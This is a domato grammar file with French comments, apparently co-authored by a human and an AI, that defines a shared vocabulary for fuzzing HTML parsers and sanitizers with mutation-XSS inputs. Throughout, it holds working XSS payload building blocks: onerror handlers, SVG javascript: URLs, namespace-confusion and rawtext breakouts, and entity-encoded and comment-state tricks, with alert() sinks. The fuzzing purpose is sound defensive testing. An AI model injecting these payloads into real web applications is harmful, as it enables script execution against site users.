# [PAI] mxss-vocab.md — VOCABULAIRE mXSS partagé (spec-fidèle) — (Humain + IA)
# Productions structurelles réorganisées depuis rules/mxss.md (Humain) ; sink + axe encodage : (IA).
# Contient : pools spec, couche sink paramétrée, axe entités/encodage, ET les hubs de classe
#   (mxss_foster, mxss_afe, mxss_foreign_confusion, mxss_template, mxss_pi, mxss_rawtext_break,
#    mxss_encoding, mxss_comment).
# NE définit NI <mxss_payload> NI de racine : c'est chaque PROFIL (mxss-*.md) qui lie
#   <mxss_payload> à UNE classe + racine -> isolation. Le global mxss-all.md !import les profils.
# Inclus via "!include mxss-vocab.md". Spec : https://html.spec.whatwg.org/multipage/parsing.html
# Rappel domato : '#' = strip de commentaire -> '#' littéral via <hash> ; '<'/'>' via <lt>/<gt>.

!max_recursion 200

## ============================================================
## COUCHE SINK PARAMÉTRÉE
# [PAI] BEGIN (IA) — remplace les xss_exec/xss_exec_attr codés en dur de l'original (l.11-21).
## ============================================================

<js_payload> = alert()
<js_payload> = alert(document.domain)
<js_payload> = print()
<js_payload p=0.05> = /*CANARY-MXSS*/

# Handlers valides sur <img> (fire sans interaction)
<img_handler> = onerror
<img_handler> = onload

<exec_element> = <lt>img src=x <img_handler>=<js_payload><gt>
<exec_element> = <lt>image src=x <img_handler>=<js_payload><gt>
<exec_element> = <lt>svg<gt><lt>image href=x <img_handler>=<js_payload> /<gt><lt>/svg<gt>
# svg+set / svg+animate : URL javascript: (quoting calqué sur l'original l.12, correct)
<exec_element> = <lt>svg viewBox="0 0 1 1" xmlns="http://www.w3.org/2000/svg"<gt><lt>a href="https://example.com/"<gt><lt>set attributeName="href" to="javascript:<js_payload>" /<gt><lt>text<gt>x<lt>/text<gt><lt>/a<gt><lt>/svg<gt>
<exec_element> = <lt>svg viewBox="0 0 1 1" xmlns="http://www.w3.org/2000/svg"<gt><lt>a href="https://example.com/"<gt><lt>animate attributeName="href" to="javascript:<js_payload>" begin="0s" dur="1s" fill="freeze" /<gt><lt>text<gt>x<lt>/text<gt><lt>/a<gt><lt>/svg<gt>

<xss_exec> = <exec_element>
# variante destinée à être réinjectée dans un title="..." (un seul handler, pas de pairing)
<xss_exec_attr> = <lt>img src=x onerror=<js_payload><gt>
# [PAI] END

## ============================================================
## VECTEURS — ÉLÉMENTS HEADING (h1-h6, spec-générique)
## ============================================================

<heading_title_elem_open> = <lt>h1<gt>
<heading_title_elem_close> = <lt>/h1<gt>
<heading_title_elem_open> = <lt>h2<gt>
<heading_title_elem_close> = <lt>/h2<gt>
<heading_title_elem_open> = <lt>h3<gt>
<heading_title_elem_close> = <lt>/h3<gt>
<heading_title_elem_open> = <lt>h4<gt>
<heading_title_elem_close> = <lt>/h4<gt>
<heading_title_elem_open> = <lt>h5<gt>
<heading_title_elem_close> = <lt>/h5<gt>
<heading_title_elem_open> = <lt>h6<gt>
<heading_title_elem_close> = <lt>/h6<gt>

## ============================================================
## FOREIGN CONTENT (HTML <-> MathML <-> SVG)
# https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-inforeign
## ============================================================

<foreign_font_elem> = <lt>font color="black"<gt>
<foreign_font_elem> = <lt>font face="black"<gt>
<foreign_font_elem> = <lt>font size=10<gt>

<foreign_content_elem_open> = <lt>math<gt>
<foreign_content_elem_close> = <lt>/math<gt>
<foreign_content_elem_open> = <lt>svg<gt>
<foreign_content_elem_close> = <lt>/svg<gt>

# MathML text integration points
# https://html.spec.whatwg.org/multipage/parsing.html#mathml-text-integration-point
<foreign_content_namespace_hip> = <lt>mi<gt>
<foreign_content_namespace_hip> = <lt>mi<gt><lt>mglyph<gt>
<foreign_content_namespace_hip> = <lt>mi<gt><lt>malignmark<gt>
<foreign_content_namespace_hip> = <lt>mo<gt>
<foreign_content_namespace_hip> = <lt>mo<gt><lt>mglyph<gt>
<foreign_content_namespace_hip> = <lt>mo<gt><lt>malignmark<gt>
<foreign_content_namespace_hip> = <lt>mn<gt>
<foreign_content_namespace_hip> = <lt>mn<gt><lt>mglyph<gt>
<foreign_content_namespace_hip> = <lt>mn<gt><lt>malignmark<gt>
<foreign_content_namespace_hip> = <lt>ms<gt>
<foreign_content_namespace_hip> = <lt>ms<gt><lt>mglyph<gt>
<foreign_content_namespace_hip> = <lt>ms<gt><lt>malignmark<gt>
<foreign_content_namespace_hip> = <lt>mtext<gt>
<foreign_content_namespace_hip> = <lt>mtext<gt><lt>mglyph<gt>
<foreign_content_namespace_hip> = <lt>mtext<gt><lt>malignmark<gt>

# HTML integration points
# https://html.spec.whatwg.org/multipage/parsing.html#html-integration-point
<foreign_content_namespace_hip> = <lt>annotation-xml encoding='text/html'<gt>
<foreign_content_namespace_hip> = <lt>annotation-xml encoding='text/html'<gt><lt>svg<gt>
<foreign_content_namespace_hip> = <lt>annotation-xml encoding='text/html'<gt><lt>mglyph<gt>
<foreign_content_namespace_hip> = <lt>annotation-xml encoding='text/html'<gt><lt>mglyph<gt><lt>svg<gt>
<foreign_content_namespace_hip> = <lt>annotation-xml encoding='text/html'<gt><lt>malignmark<gt>
<foreign_content_namespace_hip> = <lt>annotation-xml encoding='text/html'<gt><lt>malignmark<gt><lt>svg<gt>
<foreign_content_namespace_hip> = <lt>annotation-xml encoding='application/xhtml+xml'<gt>
<foreign_content_namespace_hip> = <lt>annotation-xml encoding='application/xhtml+xml'<gt><lt>svg<gt>
<foreign_content_namespace_hip> = <lt>annotation-xml encoding='application/xhtml+xml'<gt><lt>mglyph<gt>
<foreign_content_namespace_hip> = <lt>annotation-xml encoding='application/xhtml+xml'<gt><lt>mglyph<gt><lt>svg<gt>
<foreign_content_namespace_hip> = <lt>annotation-xml encoding='application/xhtml+xml'<gt><lt>malignmark<gt>
<foreign_content_namespace_hip> = <lt>annotation-xml encoding='application/xhtml+xml'<gt><lt>malignmark<gt><lt>svg<gt>

# SVG, également HTML integration points
<foreign_content_namespace_hip> = <lt>desc<gt>
<foreign_content_namespace_hip> = <lt>title<gt>
<foreign_content_namespace_hip> = <lt>foreignObject<gt>

# Éléments qui font sortir du foreign content selon la spec (liste "normally pop").
# Tous spec-légitimes — Y COMPRIS ceux qui stressent fortement les parseurs (</p>, </br>, sup).
# Une base spec-fidèle DOIT les inclure : les retirer parce qu'ils font diverger lexbor
# reviendrait à définir la base par "ce qui bugue" -> elle ne serait plus générique.
<foreign_content_pop> = <lt>/p<gt>
<foreign_content_pop> = <lt>/br<gt>
<foreign_content_pop> = <lt>sup<gt>
<foreign_content_pop> = <lt>b<gt>
<foreign_content_pop> = <lt>big<gt>
<foreign_content_pop> = <lt>blockquote<gt>
<foreign_content_pop> = <lt>body<gt>
<foreign_content_pop> = <lt>br<gt>
<foreign_content_pop> = <lt>center<gt>
<foreign_content_pop> = <lt>code<gt>
<foreign_content_pop> = <lt>dd<gt>
<foreign_content_pop> = <lt>div<gt>
<foreign_content_pop> = <lt>dl<gt>
<foreign_content_pop> = <lt>dt<gt>
<foreign_content_pop> = <lt>em<gt>
<foreign_content_pop> = <lt>embed<gt>
<foreign_content_pop> = <lt>head<gt>
<foreign_content_pop> = <heading_title_elem_open>
<foreign_content_pop> = <lt>hr<gt>
<foreign_content_pop> = <lt>i<gt>
<foreign_content_pop> = <lt>img<gt>
<foreign_content_pop> = <lt>li<gt>
<foreign_content_pop> = <lt>listing<gt>
<foreign_content_pop> = <lt>menu<gt>
<foreign_content_pop> = <lt>meta<gt>
<foreign_content_pop> = <lt>nobr<gt>
<foreign_content_pop> = <lt>ol<gt>
<foreign_content_pop> = <lt>p<gt>
<foreign_content_pop> = <lt>pre<gt>
<foreign_content_pop> = <lt>ruby<gt>
<foreign_content_pop> = <lt>s<gt>
<foreign_content_pop> = <lt>small<gt>
<foreign_content_pop> = <lt>span<gt>
<foreign_content_pop> = <lt>strong<gt>
<foreign_content_pop> = <lt>strike<gt>
<foreign_content_pop> = <lt>sub<gt>
<foreign_content_pop> = <lt>table<gt>
<foreign_content_pop> = <lt>tt<gt>
<foreign_content_pop> = <lt>u<gt>
<foreign_content_pop> = <lt>ul<gt>
<foreign_content_pop> = <lt>var<gt>
<foreign_content_pop> = <foreign_font_elem>

# Hub : confusion de namespace
<mxss_foreign_confusion> = <foreign_content_elem_open><foreign_content_pop><xss_exec>
<mxss_foreign_confusion> = <foreign_content_elem_open><foreign_content_pop><mxss_template><xss_exec>
<mxss_foreign_confusion> = <foreign_content_elem_open><foreign_content_namespace_hip><xss_exec>
<mxss_foreign_confusion> = <foreign_content_elem_open><foreign_content_namespace_hip><mxss_template><xss_exec>
# inception
<mxss_foreign_confusion> = <foreign_content_elem_open><foreign_content_pop><mxss_payload><xss_exec>
<mxss_foreign_confusion> = <foreign_content_elem_open><foreign_content_namespace_hip><mxss_payload><xss_exec>
# normalisation de <image> selon namespace
<mxss_foreign_confusion> = <foreign_content_elem_open><exec_element><foreign_content_elem_close>
<mxss_foreign_confusion> = <foreign_content_elem_open><foreign_content_namespace_hip><exec_element><foreign_content_elem_close>

## ============================================================
## RAW TEXT / RCDATA
# https://html.spec.whatwg.org/multipage/parsing.html#generic-raw-text-element-parsing-algorithm
## ============================================================

# Pools (utilisés notamment par afe_elem qui injecte un close-tag seul dans un title)
<rcdata_rawtext_elem_open> = <lt>title<gt>
<rcdata_rawtext_elem_close> = <lt>/title<gt>
<rcdata_rawtext_elem_open> = <lt>textarea<gt>
<rcdata_rawtext_elem_close> = <lt>/textarea<gt>
<rcdata_rawtext_elem_open> = <lt>style<gt>
<rcdata_rawtext_elem_close> = <lt>/style<gt>
<rcdata_rawtext_elem_open> = <lt>script<gt>
<rcdata_rawtext_elem_close> = <lt>/script<gt>
<rcdata_rawtext_elem_open> = <lt>noscript<gt>
<rcdata_rawtext_elem_close> = <lt>/noscript<gt>
<rcdata_rawtext_elem_open> = <lt>xmp<gt>
<rcdata_rawtext_elem_close> = <lt>/xmp<gt>
<rcdata_rawtext_elem_open> = <lt>iframe<gt>
<rcdata_rawtext_elem_close> = <lt>/iframe<gt>
<rcdata_rawtext_elem_open> = <lt>noembed<gt>
<rcdata_rawtext_elem_close> = <lt>/noembed<gt>
<rcdata_rawtext_elem_open> = <lt>noframes<gt>
<rcdata_rawtext_elem_close> = <lt>/noframes<gt>

# [PAI] BEGIN (IA) — FIX couplage : open/close appariés par production (domato n'a pas de backreference).
# Remplace l'ancien l.204 qui tirait open et close indépendamment -> paires incohérentes.
<mxss_rawtext_break> = <lt>style<gt><lt>a title="<lt>/style<gt><xss_exec_attr>"<gt>
<mxss_rawtext_break> = <lt>title<gt><lt>a title="<lt>/title<gt><xss_exec_attr>"<gt>
<mxss_rawtext_break> = <lt>textarea<gt><lt>a title="<lt>/textarea<gt><xss_exec_attr>"<gt>
<mxss_rawtext_break> = <lt>xmp<gt><lt>a title="<lt>/xmp<gt><xss_exec_attr>"<gt>
<mxss_rawtext_break> = <lt>iframe<gt><lt>a title="<lt>/iframe<gt><xss_exec_attr>"<gt>
<mxss_rawtext_break> = <lt>noembed<gt><lt>a title="<lt>/noembed<gt><xss_exec_attr>"<gt>
<mxss_rawtext_break> = <lt>noframes<gt><lt>a title="<lt>/noframes<gt><xss_exec_attr>"<gt>
<mxss_rawtext_break> = <lt>noscript<gt><lt>a title="<lt>/noscript<gt><xss_exec_attr>"<gt>
# inception (générique)
<mxss_rawtext_break> = <lt>style<gt><lt>a title="<lt>/style<gt><mxss_payload><xss_exec_attr>"<gt>
# [PAI] END

## ============================================================
## TEMPLATE CONTENT (DocumentFragment)
## ============================================================

<mxss_template> = <lt>template<gt><xss_exec><lt>/template<gt>
<mxss_template> = <lt>template<gt><mxss_payload><lt>/template<gt>
<mxss_template> = <lt>template<gt><mxss_foreign_confusion><lt>/template<gt>

## ============================================================
## PROCESSING INSTRUCTION / BOGUS COMMENT (§13.2.5.46)
## ============================================================

<pi> = <lt>?
<pi> = <lt><ex>
<pi> = <lt>/
<pi> = <gt>
<mxss_pi> = <pi><mxss_payload>
<mxss_pi> = <pi><mxss_payload><mxss_pi>

## ============================================================
## FOSTER PARENTING & IN-TABLE (générique uniquement)
# https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-intable
## ============================================================

<in_table_elem> = <lt>table<gt>
<in_table_elem> = <lt>template<gt>

<in_table_special_elem_open> = <lt>tbody<gt>
<in_table_special_elem_close> = <lt>/tbody<gt>
<in_table_special_elem_open> = <lt>tfoot<gt>
<in_table_special_elem_close> = <lt>/tfoot<gt>
<in_table_special_elem_open> = <lt>thead<gt>
<in_table_special_elem_close> = <lt>/thead<gt>
<in_table_special_elem_open> = <lt>td<gt>
<in_table_special_elem_close> = <lt>/td<gt>
<in_table_special_elem_open> = <lt>th<gt>
<in_table_special_elem_close> = <lt>/th<gt>
<in_table_special_elem_open> = <lt>tr<gt>
<in_table_special_elem_close> = <lt>/tr<gt>
<in_table_special_elem_open> = <lt>caption<gt>
<in_table_special_elem_close> = <lt>/caption<gt>
<in_table_special_elem_open> = <lt>colgroup<gt>
<in_table_special_elem_close> = <lt>/colgroup<gt>
<in_table_special_elem_open> = <lt>col<gt>
<in_table_special_elem_close> = <lt>/col<gt>

<in_table_textarea_payload> = <lt>textarea<gt>.<lt>/textarea<gt>
<in_table_textarea_payload> = <lt>textarea<gt><afe_elem>.<lt>/textarea<gt>

<mxss_foster> = <in_table_elem><afe_elem><in_table_special_elem_open><in_table_textarea_payload>
<mxss_foster> = <in_table_elem><mxss_payload><in_table_special_elem_open><in_table_textarea_payload>
# l'élément de clôture peut ne pas correspondre à l'ouverture (volontaire, à étiqueter)
<mxss_foster> = <in_table_elem><in_table_special_elem_open><afe_elem><in_table_special_elem_close><in_table_textarea_payload>
<mxss_foster> = <in_table_elem><in_table_special_elem_open><mxss_payload><in_table_special_elem_close><in_table_textarea_payload>

## ============================================================
## ADOPTION AGENCY / ACTIVE FORMATTING ELEMENTS
# https://html.spec.whatwg.org/multipage/parsing.html#formatting
## ============================================================

<afe_elem> = <lt>a<gt>
<afe_elem> = <lt>a title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>b<gt>
<afe_elem> = <lt>b title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>big<gt>
<afe_elem> = <lt>big title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>code<gt>
<afe_elem> = <lt>code title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>em<gt>
<afe_elem> = <lt>em title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>font<gt>
<afe_elem> = <lt>font title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>i<gt>
<afe_elem> = <lt>i title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>nobr<gt>
<afe_elem> = <lt>nobr title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>s<gt>
<afe_elem> = <lt>s title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>small<gt>
<afe_elem> = <lt>small title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>strike<gt>
<afe_elem> = <lt>strike title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>strong<gt>
<afe_elem> = <lt>strong title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>tt<gt>
<afe_elem> = <lt>tt title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>u<gt>
<afe_elem> = <lt>u title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>

# https://html.spec.whatwg.org/multipage/parsing.html#has-an-element-in-the-specific-scope
<element_in_scope> = <lt>applet<gt>
<element_in_scope> = <lt>applet<gt><mxss_payload>
<element_in_scope> = <lt>caption<gt>
<element_in_scope> = <lt>caption<gt><mxss_payload>
<element_in_scope> = <lt>html<gt>
<element_in_scope> = <lt>html<gt><mxss_payload>
<element_in_scope> = <lt>table<gt>
<element_in_scope> = <lt>table<gt><mxss_payload>
<element_in_scope> = <lt>td<gt>
<element_in_scope> = <lt>td<gt><mxss_payload>
<element_in_scope> = <lt>th<gt>
<element_in_scope> = <lt>th<gt><mxss_payload>
<element_in_scope> = <lt>marquee<gt>
<element_in_scope> = <lt>marquee<gt><mxss_payload>
<element_in_scope> = <lt>object<gt>
<element_in_scope> = <lt>object<gt><mxss_payload>
<element_in_scope> = <lt>select<gt>
<element_in_scope> = <lt>select<gt><mxss_payload>
<element_in_scope> = <lt>template<gt><lt>a<gt>test<lt>/a<gt><lt>/template<gt>
<element_in_scope> = <lt>template<gt><mxss_payload><lt>/template<gt><mxss_payload>
<element_in_scope> = <lt>math<gt><lt>mi<gt>
<element_in_scope> = <lt>math<gt><lt>mi<gt><mxss_payload>
<element_in_scope> = <lt>math<gt><lt>mo<gt>
<element_in_scope> = <lt>math<gt><lt>mo<gt><mxss_payload>
<element_in_scope> = <lt>math<gt><lt>mn<gt>
<element_in_scope> = <lt>math<gt><lt>mn<gt><mxss_payload>
<element_in_scope> = <lt>math<gt><lt>ms<gt>
<element_in_scope> = <lt>math<gt><lt>ms<gt><mxss_payload>
<element_in_scope> = <lt>math<gt><lt>mtext<gt>
<element_in_scope> = <lt>math<gt><lt>mtext<gt><mxss_payload>
<element_in_scope> = <lt>annotation-xml encoding='text/html'<gt>
<element_in_scope> = <lt>annotation-xml encoding='text/html'<gt><mxss_payload>
<element_in_scope> = <lt>svg<gt><lt>foreignObject<gt>
<element_in_scope> = <lt>svg<gt><lt>foreignObject<gt><mxss_payload>
<element_in_scope> = <lt>svg<gt><lt>desc<gt>
<element_in_scope> = <lt>svg<gt><lt>desc<gt><mxss_payload>
<element_in_scope> = <lt>svg<gt><lt>title<gt>
<element_in_scope> = <lt>svg<gt><lt>title<gt><mxss_payload>

<mxss_afe> = <heading_title_elem_open><afe_elem><element_in_scope><heading_title_elem_close><xss_exec>
<mxss_afe> = <heading_title_elem_open><afe_elem><element_in_scope><heading_title_elem_close><mxss_payload>
<mxss_afe> = <heading_title_elem_open><mxss_payload><element_in_scope><heading_title_elem_close>

## ============================================================
## AXE ENTITÉS / ENCODAGE / COMMENTAIRES / CDATA
# [PAI] BEGIN (IA) — coeur du canon mXSS (asymétrie parse -> sérialise -> re-parse), absent de l'original.
# Rappel : références numériques via <hash> ('#' = commentaire en domato).
## ============================================================

# RCDATA décode les références de caractères ; RAWTEXT non -> source d'asymétrie.
<entity_lt> = &lt;
<entity_lt> = &LT;
<entity_lt> = &lt
<entity_lt> = &<hash>60;
<entity_lt> = &<hash>x3c;
<entity_lt> = &<hash>x3C;
<entity_lt> = &<hash>x0003c;
<entity_lt> = &amp;lt;
<entity_gt> = &gt;
<entity_gt> = &gt
<entity_gt> = &<hash>62;
<entity_gt> = &<hash>x3e;

<lt_variant> = <lt>
<lt_variant> = <entity_lt>
<gt_variant> = <gt>
<gt_variant> = <entity_gt>

# exec dont les chevrons peuvent être encodés
<encoded_exec> = <lt_variant>img src=x onerror=<js_payload><gt_variant>

# round-trip en conteneur RAWTEXT (style/xmp) vs RCDATA (title/textarea)
<rawtext_roundtrip> = <lt>style<gt><encoded_exec><lt>/style<gt>
<rawtext_roundtrip> = <lt>xmp<gt><encoded_exec><lt>/xmp<gt>
<rawtext_roundtrip> = <lt>title<gt><encoded_exec><lt>/title<gt>
<rawtext_roundtrip> = <lt>textarea<gt><encoded_exec><lt>/textarea<gt>

# noscript : scripting actif (navigateur = RAWTEXT) vs inactif (sanitiseur = enfants parsés)
<noscript_divergence> = <lt>noscript<gt><encoded_exec><lt>/noscript<gt>
<noscript_divergence> = <lt>noscript<gt><lt>p<gt><encoded_exec><lt>/noscript<gt>

# CDATA : significatif seulement en foreign content (svg/math) ; bogus comment ailleurs
<cdata_foreign> = <foreign_content_elem_open><lt>![CDATA[<encoded_exec>]]<gt><foreign_content_elem_close>
<cdata_foreign> = <lt>![CDATA[<encoded_exec>]]<gt>

# Breakout d'attribut par quote ENCODÉE : si le sérialiseur ne ré-encode pas la quote
# décodée dans la valeur, le reparse la voit comme délimiteur -> sortie de l'attribut.
# Quotes APPARIÉES par production (la forme encodée correspond à la quote externe) — pas de pool partagé.
<enc_dquote> = &quot;
<enc_dquote> = &<hash>34;
<enc_dquote> = &<hash>x22;
<enc_squote> = &apos;
<enc_squote> = &<hash>39;
<enc_squote> = &<hash>x27;

<mxss_attr_quote_break> = <lt>a title="<enc_dquote><gt><xss_exec_attr>"<gt>
<mxss_attr_quote_break> = <lt>a title='<enc_squote><gt><xss_exec_attr>'<gt>
# inception
<mxss_attr_quote_break> = <lt>a title="<enc_dquote><gt><mxss_payload><xss_exec_attr>"<gt>

<mxss_encoding> = <rawtext_roundtrip>
<mxss_encoding> = <noscript_divergence>
<mxss_encoding> = <cdata_foreign>
<mxss_encoding> = <mxss_attr_quote_break>

# états de commentaire (abrupt-closing, comment-end-bang, incorrectly-opened)
<mxss_comment> = <lt><ex>--<gt><encoded_exec>
<mxss_comment> = <lt><ex>--<lt><ex>--<gt><encoded_exec>--<ex><gt>
<mxss_comment> = <lt><ex>----<gt><encoded_exec>
# [PAI] END

# FIN DU VOCABULAIRE — pas de <mxss_payload>, pas de racine ici (voir les profils mxss-*.md).
